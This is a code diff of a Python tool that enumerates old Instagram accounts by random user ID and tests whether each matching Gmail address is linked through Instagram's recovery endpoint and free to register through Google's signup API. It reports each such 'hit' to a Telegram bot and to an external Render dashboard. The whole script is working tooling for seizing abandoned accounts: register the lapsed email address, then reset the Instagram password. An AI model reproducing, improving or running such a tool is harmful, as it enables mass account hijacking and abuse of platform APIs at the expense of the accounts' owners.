@@ -1,5 +1,3 @@
-print("2k13 to 2k15 hits by team tx  ")
-print("owner ;peter")
 import os
 import sys
 import re
@@ -10,152 +8,141 @@ import hashlib
 import uuid
 import time
 from datetime import datetime
-from threading import Thread
+from threading import Thread, Lock
 import requests
 from requests import post as pp
 from user_agent import generate_user_agent
 from random import choice, randrange
-from colorama import Fore, Style, init
+from colorama import init
 
 init(autoreset=True)
 
 # ================= FIXED DASHBOARD SYNC LOGIC =================
 def send_to_dashboard(stat_type):
     try:
-        # Render Live URL for syncing stats - Localhost (127.0.0.1) Render par kaam nahi karta
+        # Render Live URL - Dashboard stats sync ke liye
         url = 'https://system-override-v2.onrender.com/update_stats'
         requests.post(url, json={'type': stat_type}, timeout=3)
     except:
         pass
-# =============================================================
 
-# Arguments check (Dashboard passes ID and Token automatically)
+# Dashboard automatically ID aur Token bhejta hai
 if len(sys.argv) > 2:
     ID = sys.argv[1]
     TOKEN = sys.argv[2]
 else:
     ID = input("\033[1;36mEnter Telegram ID: ")
     TOKEN = input("\033[1;36mEnter Bot Token: ")
+# =============================================================
 
+# Config
 INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
-COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
 TOKEN_FILE = 'tl.txt'
 eizon_domain = '@gmail.com' 
 
-# Colors
-C1 = '\x1b[38;5;120m'
-P1 = '\x1b[38;5;150m'
-Z = '\x1b[1;31m'
-P = '\x1b[1;97m'
-
+# Global Stats & Lock
 hits = 0
-bad_insta = 0
-bad_email = 0
+bad_count = 0
 good_ig = 0
+stats_lock = Lock()
 
-def update_stats_terminal():
-    # Dashboard stats update
-    sysdontwrite = f"\r{C1}Hits{P1} : {hits} |{Z} Bad IG{P} : {bad_insta} | {Z}Bad Email : {bad_email} | {P}Good{Z} : {good_ig}"
-    sys.stdout.write(sysdontwrite)
-    sys.stdout.flush()
-
-def check_gmail(email):
-    global bad_email, hits
+def get_google_token():
+    """Initial Google Token Setup for Gmail Checking"""
     try:
-        email_prefix = email.split('@')[0] if '@' in email else email
-        # Path check for Render - 'tl.txt' root directory mein honi chahiye
-        if os.path.exists(TOKEN_FILE):
-            with open(TOKEN_FILE, 'r') as f:
-                token_data = f.read().splitlines()[0]
-            tl, host = token_data.split('//')
-            
-            headers = {
-                'authority': 'accounts.google.com',
-                'google-accounts-xsrf': '1',
-                'user-agent': generate_user_agent()
-            }
-            params = {'TL': tl}
-            data = f"f.req=%5B%22TL%3A{tl}%22%2C%22{email_prefix}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
-            
-            response = pp("https://accounts.google.com/_/signup/usernameavailability", params=params, headers=headers, data=data)
-            
-            if '"gf.uar",1' in response.text:
-                hits += 1
-                send_to_dashboard('hit') # Hits dashboard par bhejna
-                update_stats_terminal()
-                InfoAcc(email_prefix, "gmail.com")
-            else:
-                bad_email += 1
-                send_to_dashboard('bad') 
-                update_stats_terminal()
+        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
+        headers = {'google-accounts-xsrf': '1', 'User-Agent': generate_user_agent()}
+        res = requests.get("https://accounts.google.com/signin/v2/usernamerecovery?hl=en-GB", headers=headers)
+        match = re.search('data-initial-setup-data=".*?&quot;(.*?)&quot;', res.text)
+        if match:
+            tok = match.group(1)
+            host = ''.join(choice(alphabet) for _ in range(20))
+            with open(TOKEN_FILE, 'w') as f:
+                f.write(f"{tok}//{host}")
         else:
-            # If tl.txt missing, counting bad to keep dashboard updated
-            bad_email += 1
-            send_to_dashboard('bad')
+            time.sleep(2)
+            get_google_token()
     except:
-        pass
+        time.sleep(2)
+        get_google_token()
 
-def check(email):
-    global good_ig, bad_insta
+# Start token generation
+if not os.path.exists(TOKEN_FILE):
+    get_google_token()
+
+def check_gmail(email_prefix):
+    global hits, bad_count
     try:
-        headers = {'User-Agent': generate_user_agent(), 'Cookie': COOKIE_VALUE}
-        data = {
-            'signed_body': 'sign.' + json.dumps({
-                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
-                'query': email,
-                'device_id': f'android-{uuid.uuid4().hex[:16]}'
-            }),
-            'ig_sig_key_version': '4'
-        }
+        if not os.path.exists(TOKEN_FILE): get_google_token()
+        with open(TOKEN_FILE, 'r') as f:
+            token_data = f.read().split('//')
+            tl, host = token_data[0], token_data[1]
+            
+        headers = {'google-accounts-xsrf': '1', 'User-Agent': generate_user_agent()}
+        data = f"f.req=%5B%22TL%3A{tl}%22%2C%22{email_prefix}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
+        res = requests.post("https://accounts.google.com/_/signup/usernameavailability", headers=headers, data=data, cookies={'__Host-GAPS': host})
         
-        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
-        if email in response:
-            good_ig += 1
-            if eizon_domain in email:
-                check_gmail(email)
-            update_stats_terminal()
+        if '"gf.uar",1' in res.text:
+            with stats_lock: hits += 1
+            send_to_dashboard('hit')
+            return True
         else:
-            bad_insta += 1
-            send_to_dashboard('bad') 
-            update_stats_terminal()
-    except:
-        pass
+            with stats_lock: bad_count += 1
+            send_to_dashboard('bad')
+            return False
+    except: return False
 
-def InfoAcc(username, domain):
+def check_instagram(email):
+    global good_ig, bad_count
+    headers = {'User-Agent': generate_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded'}
+    data = {'signed_body': f'sign.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","query":"{email}"}}', 'ig_sig_key_version': '4'}
+    try:
+        res = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
+        if email in res:
+            with stats_lock: good_ig += 1
+            if check_gmail(email.split('@')[0]):
+                send_hit_telegram(email)
+        else:
+            send_to_dashboard('bad')
+            with stats_lock: bad_count += 1
+    except: pass
+
+def send_hit_telegram(email):
+    user = email.split('@')[0]
     info_text = f"""
-━━━━━━━━━━━━━━━
-🚀 HIT FOUND (2013-15)
-🛰 USER: {username}
-🌠 EMAIL: {username}@{domain}
+━━━━━━━━━━━━━━━ 🚀
+☄️ HIT FOUND (2013-15)
+🛰 USER: {user}
+🌠 EMAIL: {email}
 💀 OWNER: Peter
 ━━━━━━━━━━━━━━━
 """
     try:
+        # NO BRACKETS: Direct variables used for Telegram API
         requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
     except:
         pass
 
-def eizon_python():
+def worker():
     while True:
+        lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+        # 2013-2015 ID Range logic
+        data = {
+            'lsd': lsd,
+            'variables': json.dumps({'id': random.randrange(266028916, 1900000000), 'render_surface': 'PROFILE'}),
+            'doc_id': '25618261841150840'
+        }
         try:
-            lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
-            data = {
-                'lsd': lsd,
-                'variables': json.dumps({'id': int(random.randrange(266028916, 1900000000)), 'render_surface': 'PROFILE'}),
-                'doc_id': '25618261841150840'
-            }
-            headers = {'X-FB-LSD': lsd}
-            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
-            account = response.json().get('data', {}).get('user', {})
-            username = account.get('username')
+            res = requests.post('https://www.instagram.com/api/graphql', headers={'X-FB-LSD': lsd}, data=data)
+            user_data = res.json().get('data', {}).get('user', {})
+            username = user_data.get('username')
             if username:
-                check(username + eizon_domain)
+                check_instagram(username + eizon_domain)
         except:
             time.sleep(2)
 
-# Threads - Render Free Tier par 15 best hain
+# Threads - Render Free Tier par 15 best hain stability ke liye
 for _ in range(15):
-    Thread(target=eizon_python, daemon=True).start()
+    Thread(target=worker, daemon=True).start()
 
 while True:
     time.sleep(10)
